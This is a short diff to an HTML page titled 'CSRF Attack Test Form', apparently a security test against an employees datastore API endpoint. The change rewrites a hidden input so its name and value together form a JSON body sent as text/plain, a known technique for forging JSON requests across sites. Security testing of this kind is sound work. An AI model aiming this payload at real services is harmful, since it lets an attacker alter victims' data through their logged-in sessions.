@@ -9,7 +9,7 @@
 <h1>CSRF Attack Test Form</h1>
 
 <form id="csrf-form" action="https://rollun.net/api/datastore/EmployeesDataStore" method="POST" enctype="text/plain">
-  <input type="hidden" name='{"GUID":"test","Name":"test"}' value="">
+  <input type="hidden" name='{"GUID":"test","Name":"test", "foo":"}' value='bar"}'>
   <button type="submit">Send CSRF Test text/plain</button>
 </form>
 
